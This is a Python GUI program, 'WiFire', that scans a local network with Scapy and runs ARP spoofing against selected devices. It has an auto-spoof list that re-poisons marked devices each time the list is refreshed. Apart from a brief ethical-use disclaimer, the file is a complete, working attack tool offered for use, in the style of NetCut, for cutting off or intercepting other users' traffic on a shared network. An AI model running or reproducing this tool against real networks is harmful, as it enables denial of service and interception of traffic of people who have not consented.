"""
WiFire - Network Control Tool

This program is an educational tool designed for network analysis and
administration. It allows users to scan a network for connected devices,
retrieve their IP and MAC addresses, and perform ARP spoofing for testing
and security auditing purposes.

⚠️ Disclaimer: This tool is intended for ethical and educational use only.

 Developed using Python with Scapy for packet manipulation and Tkinter
 for a graphical user interface.

"""
import scapy.all as scapy
import os
import netifaces
import sys
import time
import tkinter as tk
from tkinter import ttk, messagebox
import ipaddress
import concurrent.futures
import json
import platform
import ctypes
import socket

# Check for administrative privileges
def has_admin():
    """Check if the program is running with admin/root privileges."""
    if platform.system() == "Linux":
        return os.geteuid() == 0
    elif platform.system() == "Windows":
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return False

# Get device name by IP
def get_device_name(ip):
    """Retrieve the device name (hostname) for a given IP address."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except socket.herror:
        return "Unknown"

# Get MAC address for a given IP
def get_mac(ip):
    """Retrieve the MAC address for a given IP using ARP."""
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        response = scapy.srp(broadcast / arp_request, timeout=2, verbose=False)[0]
        return response[0][1].hwsrc if response else None
    except Exception as e:
        print(f"Error getting MAC for {ip}: {e}")
        return None

# Scan network for connected clients
def connected_clients(ip_range):
    """Scan the network and return a list of connected clients with IP, MAC, and device name."""
    try:
        arp_request = scapy.ARP(pdst=ip_range)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        response = scapy.srp(broadcast / arp_request, timeout=2, verbose=False)[0]
        clients = [{"ip": client[1].psrc, "mac": client[1].hwsrc} for client in response]

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_ip = {executor.submit(get_device_name, client["ip"]): client for client in clients}
            for future in concurrent.futures.as_completed(future_to_ip):
                client = future_to_ip[future]
                try:
                    device_name = future.result(timeout=5)
                except concurrent.futures.TimeoutError:
                    device_name = "Unknown"
                except Exception:
                    device_name = "Unknown"
                client["device"] = device_name
        return clients
    except Exception as e:
        print(f"Error scanning network: {e}")
        return []

class ARPSpoof:
    """Class to handle ARP spoofing for a target."""
    def __init__(self, target, gateway, interval=1):
        self.target = target
        self.gateway = gateway
        self.interval = interval
        self.running = False

    def start(self):
        """Start ARP spoofing by sending spoofed packets at specified intervals."""
        self.running = True
        while self.running:
            try:
                packet1 = scapy.ARP(op=2, pdst=self.target["ip"], hwdst=self.target["mac"], psrc=self.gateway["ip"])
                scapy.send(packet1, verbose=False)
                packet2 = scapy.ARP(op=2, pdst=self.gateway["ip"], hwdst=self.gateway["mac"], psrc=self.target["ip"])
                scapy.send(packet2, verbose=False)
                time.sleep(self.interval)
            except Exception as e:
                print(f"Error during spoofing: {e}")
                self.running = False

    def stop(self):
        """Stop spoofing and restore ARP tables with multiple attempts."""
        self.running = False
        for _ in range(5):
            try:
                packet1 = scapy.ARP(op=2, pdst=self.target["ip"], hwdst=self.target["mac"], psrc=self.gateway["ip"],
                                    hwsrc=self.gateway["mac"])
                scapy.send(packet1, verbose=False)
                packet2 = scapy.ARP(op=2, pdst=self.gateway["ip"], hwdst=self.gateway["mac"], psrc=self.target["ip"],
                                    hwsrc=self.target["mac"])
                scapy.send(packet2, verbose=False)
                time.sleep(0.5)
            except Exception as e:
                print(f"Error restoring ARP: {e}")

class NetCutGUI:
    """GUI class for the ARP spoofing tool."""
    def __init__(self, root):
        self.root = root
        self.root.title("WiFire - Network Control")
        self.root.grid_rowconfigure(2, weight=1)
        self.root.grid_columnconfigure(0, weight=1)

        # Set up modern style
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.root.configure(bg="#2b2b2b")
        self.style.configure("TFrame", background="#2b2b2b")
        self.style.configure("TLabel", background="#2b2b2b", foreground="#ffffff", font=("Helvetica", 11))
        self.style.configure("TButton", background="#3c8dbc", foreground="#ffffff", font=("Helvetica", 10, "bold"))
        self.style.map("TButton", background=[("active", "#367fa9")])
        self.style.configure("Treeview", background="#2b2b2b", foreground="#ffffff", fieldbackground="#2b2b2b")
        self.style.configure("Treeview.Heading", background="#3c8dbc", foreground="#ffffff")
        self.style.configure("TEntry", fieldbackground="#2b2b2b", foreground="#ffffff")
        self.style.configure("TCombobox", fieldbackground="#2b2b2b", background="#2b2b2b", foreground="#ffffff")

        # Check admin privileges
        if not has_admin():
            messagebox.showerror("Error", "Please run as Administrator/Root.")
            sys.exit(1)

        # Initialize variables
        self.interfaces = netifaces.interfaces()
        self.targets = []
        self.clients = []
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
        self.scanning = False
        self.auto_spoof_macs = self.load_auto_spoof()  # Load auto-spoof list

        # Setup GUI
        self._setup_frames()
        self._setup_widgets()
        self._set_default_interface()

    def _setup_frames(self):
        """Setup the main frames for the GUI layout."""
        self.top_frame = ttk.Frame(self.root)
        self.top_frame.grid(row=0, column=0, sticky="ew", padx=5, pady=5)
        self.label_frame = ttk.Frame(self.root)
        self.label_frame.grid(row=1, column=0, sticky="ew", padx=5, pady=5)
        self.middle_frame = ttk.Frame(self.root)
        self.middle_frame.grid(row=2, column=0, sticky="ew", padx=5, pady=5)
        self.main_frame = ttk.Frame(self.root)
        self.main_frame.grid(row=3, column=0, sticky="nsew", padx=5, pady=5)
        self.bottom_frame = ttk.Frame(self.root)
        self.bottom_frame.grid(row=4, column=0, sticky="ew", padx=5, pady=5)

    def _setup_widgets(self):
        """Setup all GUI widgets."""
        ttk.Label(self.top_frame, text="Interface:").grid(row=0, column=0, padx=5)
        self.interface_var = tk.StringVar()
        self.interface_combo = ttk.Combobox(self.top_frame, textvariable=self.interface_var, values=self.interfaces)
        self.interface_combo.grid(row=0, column=1, padx=5)
        ttk.Button(self.top_frame, text="Apply", command=self.apply_interface).grid(row=0, column=2, padx=5)

        self.label = ttk.Label(self.label_frame, text="", font=("Helvetica", 12))
        self.label.pack(pady=5)

        ttk.Label(self.middle_frame, text="Search:").grid(row=0, column=0, padx=5)
        self.search_var = tk.StringVar()
        ttk.Entry(self.middle_frame, textvariable=self.search_var).grid(row=0, column=1, padx=5)
        ttk.Button(self.middle_frame, text="Filter", command=self.filter_clients).grid(row=0, column=2, padx=5)
        self.refresh_button = ttk.Button(self.middle_frame, text="Refresh", command=self.refresh_clients)
        self.refresh_button.grid(row=0, column=3, padx=5)

        self.tree_frame = ttk.Frame(self.main_frame)
        self.tree_frame.grid(row=0, column=0, sticky="nsew")
        # Updated Treeview with Auto-Spoof column
        self.tree = ttk.Treeview(self.tree_frame, columns=("Device", "IP", "MAC", "Auto-Spoof"), show="headings", height=15)
        self.tree.heading("Device", text="Device Name")
        self.tree.heading("IP", text="IP Address")
        self.tree.heading("MAC", text="MAC Address")
        self.tree.heading("Auto-Spoof", text="Auto-Spoof")
        self.tree.column("Device", width=200)
        self.tree.column("IP", width=150)
        self.tree.column("MAC", width=200)
        self.tree.column("Auto-Spoof", width=100)
        self.tree.pack(side="left", fill="both", expand=True)
        tree_scrollbar = ttk.Scrollbar(self.tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=tree_scrollbar.set)
        tree_scrollbar.pack(side="right", fill="y")

        self.log_frame = ttk.Frame(self.main_frame)
        self.log_frame.grid(row=0, column=1, sticky="nsew")
        self.log_text = tk.Text(self.log_frame, height=15, width=50, bg="#1e1e1e", fg="#ffffff",
                                insertbackground="#ffffff")
        self.log_text.pack(side="left", fill="both", expand=True)
        log_scrollbar = ttk.Scrollbar(self.log_frame, orient="vertical", command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=log_scrollbar.set)
        log_scrollbar.pack(side="right", fill="y")

        self.main_frame.grid_columnconfigure(0, weight=1)
        self.main_frame.grid_columnconfigure(1, weight=1)

        ttk.Label(self.bottom_frame, text="Spoofing Interval (s):").grid(row=0, column=0, padx=5)
        self.interval_var = tk.StringVar(value="1")
        ttk.Entry(self.bottom_frame, textvariable=self.interval_var, width=5).grid(row=0, column=1, padx=5)
        ttk.Button(self.bottom_frame, text="Start Spoofing", command=self.start_spoofing).grid(row=0, column=2, padx=5)
        ttk.Button(self.bottom_frame, text="Stop Spoofing", command=self.stop_spoofing).grid(row=0, column=3, padx=5)
        ttk.Button(self.bottom_frame, text="Save Config", command=self.save_config).grid(row=0, column=4, padx=5)
        ttk.Button(self.bottom_frame, text="Load Config", command=self.load_config).grid(row=0, column=5, padx=5)
        # New buttons for auto-spoof management
        ttk.Button(self.bottom_frame, text="Mark Auto-Spoof", command=self.mark_auto_spoof).grid(row=0, column=6, padx=5)
        ttk.Button(self.bottom_frame, text="Unmark Auto-Spoof", command=self.unmark_auto_spoof).grid(row=0, column=7, padx=5)

    def load_auto_spoof(self):
        """Load the list of MAC addresses marked for auto-spoofing from a file."""
        try:
            with open("auto_spoof.json", "r") as f:
                return set(json.load(f))
        except FileNotFoundError:
            return set()
        except Exception as e:
            self.log_message(f"Error loading auto-spoof list: {e}")
            return set()

    def save_auto_spoof(self):
        """Save the list of MAC addresses marked for auto-spoofing to a file."""
        try:
            with open("auto_spoof.json", "w") as f:
                json.dump(list(self.auto_spoof_macs), f)
        except Exception as e:
            self.log_message(f"Error saving auto-spoof list: {e}")

    def _set_default_interface(self):
        """Set the default network interface and apply it."""
        gateways = netifaces.gateways()
        default_interface = gateways['default'].get(netifaces.AF_INET, [None, None])[1]
        if default_interface in self.interfaces:
            self.interface_var.set(default_interface)
            self.apply_interface()
        else:
            self.log_message("No default interface found. Please select an interface.")

    def log_message(self, message):
        """Append a message to the log window."""
        self.log_text.insert("end", f"{message}\n")
        self.log_text.see("end")

    def apply_interface(self):
        """Apply the selected network interface and refresh clients."""
        selected_interface = self.interface_var.get()
        if selected_interface not in self.interfaces:
            messagebox.showerror("Error", "Invalid interface selected.")
            return
        self.interface = selected_interface
        try:
            addrs = netifaces.ifaddresses(self.interface)
            inet_info = addrs.get(netifaces.AF_INET)
            if not inet_info:
                messagebox.showerror("Error", "No IPv4 address found for this interface.")
                return
            ip = inet_info[0]['addr']
            netmask = inet_info[0]['netmask']
            interface = ipaddress.IPv4Interface(f"{ip}/{netmask}")
            self.network = interface.network

            gateways = netifaces.gateways()
            gateway_list = gateways.get(netifaces.AF_INET, [])
            for gw, iface, _ in gateway_list:
                if iface == self.interface:
                    self.gateway_ip = gw
                    break
            else:
                messagebox.showerror("Error", "No gateway found for this interface.")
                return

            self.gateway_mac = get_mac(self.gateway_ip)
            if not self.gateway_mac:
                messagebox.showerror("Error", "Could not find gateway's MAC address.")
                return

            self.label.config(text=f"Interface: {self.interface}, Gateway: {self.gateway_ip}")
            self.refresh_clients()
            self.log_message(f"Applied interface: {self.interface}, Gateway: {self.gateway_ip}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to apply interface: {str(e)}")

    def refresh_clients(self):
        """Refresh the list of connected clients in a background thread."""
        if self.scanning:
            return
        self.scanning = True
        self.refresh_button.config(state="disabled")
        self.log_message("Refreshing client list...")
        self.executor.submit(self._scan_clients)

    def _scan_clients(self):
        """Run the scanning in a background thread and schedule GUI update."""
        clients = connected_clients(str(self.network))
        self.root.after(0, lambda: self.update_client_list(clients))

    def update_client_list(self, clients):
        """Update the client list in the GUI and start auto-spoofing."""
        self.clients = clients
        for item in self.tree.get_children():
            self.tree.delete(item)
        for client in self.clients:
            spoofed = any(t.target["ip"] == client["ip"] and t.running for t in self.targets)
            device_name = f"{client['device']} (Spoofed)" if spoofed else client["device"]
            auto_spoof = "Yes" if client["mac"] in self.auto_spoof_macs else "No"
            self.tree.insert("", "end", values=(device_name, client["ip"], client["mac"], auto_spoof))
        self.log_message(f"Found {len(self.clients)} clients.")
        self.scanning = False
        self.refresh_button.config(state="normal")
        # Automatically start spoofing for auto-spoof devices
        for client in self.clients:
            if client["mac"] in self.auto_spoof_macs and not any(t.target["ip"] == client["ip"] for t in self.targets):
                target = {"ip": client["ip"], "mac": client["mac"]}
                gateway = {"ip": self.gateway_ip, "mac": self.gateway_mac}
                try:
                    interval = float(self.interval_var.get())
                    if interval <= 0:
                        raise ValueError
                except ValueError:
                    self.log_message("Invalid spoofing interval for auto-spoof.")
                    continue
                spoof = ARPSpoof(target, gateway, interval)
                self.targets.append(spoof)
                self.executor.submit(spoof.start)
                # Update Treeview to show "(Spoofed)"
                for item in self.tree.get_children():
                    values = self.tree.item(item, "values")
                    if values[2] == client["mac"]:
                        original_device = values[0].replace(" (Spoofed)", "")
                        self.tree.item(item, values=(f"{original_device} (Spoofed)", values[1], values[2], values[3]))
                        break
                self.log_message(f"Auto-started spoofing for {client['ip']}")

    def filter_clients(self):
        """Filter the client list based on search input."""
        search_term = self.search_var.get().lower()
        for item in self.tree.get_children():
            self.tree.delete(item)
        for client in self.clients:
            if (search_term in client["ip"].lower() or
                    search_term in client["mac"].lower() or
                    search_term in client["device"].lower()):
                spoofed = any(t.target["ip"] == client["ip"] and t.running for t in self.targets)
                device_name = f"{client['device']} (Spoofed)" if spoofed else client["device"]
                auto_spoof = "Yes" if client["mac"] in self.auto_spoof_macs else "No"
                self.tree.insert("", "end", values=(device_name, client["ip"], client["mac"], auto_spoof))

    def start_spoofing(self):
        """Start ARP spoofing for selected targets and update GUI."""
        selected = self.tree.selection()
        if not selected:
            messagebox.showerror("Error", "No target selected!")
            return

        try:
            interval = float(self.interval_var.get())
            if interval <= 0:
                raise ValueError
        except ValueError:
            messagebox.showerror("Error", "Invalid spoofing interval.")
            return

        for item in selected:
            values = self.tree.item(item, "values")
            target_ip = values[1]
            if any(t.target["ip"] == target_ip for t in self.targets):
                continue
            target = {"ip": target_ip, "mac": values[2]}
            gateway = {"ip": self.gateway_ip, "mac": self.gateway_mac}
            spoof = ARPSpoof(target, gateway, interval)
            self.targets.append(spoof)
            self.executor.submit(spoof.start)
            new_device = f"{values[0].replace(' (Spoofed)', '')} (Spoofed)"
            self.tree.item(item, values=(new_device, values[1], values[2], values[3]))
            self.log_message(f"Started spoofing for {target_ip}")

    def stop_spoofing(self):
        """Stop ARP spoofing for all targets and update GUI."""
        for target in self.targets:
            target.stop()
            for item in self.tree.get_children():
                values = self.tree.item(item, "values")
                if values[1] == target.target["ip"]:
                    original_device = values[0].replace(" (Spoofed)", "")
                    self.tree.item(item, values=(original_device, values[1], values[2], values[3]))
            self.log_message(f"Stopped spoofing for {target.target['ip']}")
        self.targets = []

    def save_config(self):
        """Save selected targets to a configuration file."""
        selected = self.tree.selection()
        if not selected:
            messagebox.showerror("Error", "No targets selected to save.")
            return
        targets = [self.tree.item(item, "values")[1] for item in selected]
        try:
            with open("config.json", "w") as f:
                json.dump(targets, f)
            self.log_message("Configuration saved.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save configuration: {str(e)}")

    def load_config(self):
        """Load selected targets from a configuration file."""
        try:
            with open("config.json", "r") as f:
                targets = json.load(f)
            for item in self.tree.get_children():
                values = self.tree.item(item, "values")
                if values[1] in targets:
                    self.tree.selection_add(item)
            self.log_message("Configuration loaded.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load configuration: {str(e)}")

    def mark_auto_spoof(self):
        """Mark selected devices for automatic spoofing."""
        selected = self.tree.selection()
        if not selected:
            messagebox.showerror("Error", "No target selected!")
            return
        for item in selected:
            mac = self.tree.item(item, "values")[2]
            if mac not in self.auto_spoof_macs:
                self.auto_spoof_macs.add(mac)
                values = self.tree.item(item, "values")
                self.tree.item(item, values=(values[0], values[1], values[2], "Yes"))
        self.save_auto_spoof()
        self.log_message("Marked selected devices for auto-spoofing.")

    def unmark_auto_spoof(self):
        """Unmark selected devices from automatic spoofing."""
        selected = self.tree.selection()
        if not selected:
            messagebox.showerror("Error", "No target selected!")
            return
        for item in selected:
            mac = self.tree.item(item, "values")[2]
            if mac in self.auto_spoof_macs:
                self.auto_spoof_macs.remove(mac)
                values = self.tree.item(item, "values")
                self.tree.item(item, values=(values[0], values[1], values[2], "No"))
        self.save_auto_spoof()
        self.log_message("Unmarked selected devices for auto-spoofing.")

    def on_closing(self):
        """Handle application closure."""
        self.stop_spoofing()
        self.executor.shutdown(wait=False)
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = NetCutGUI(root)
    root.mainloop()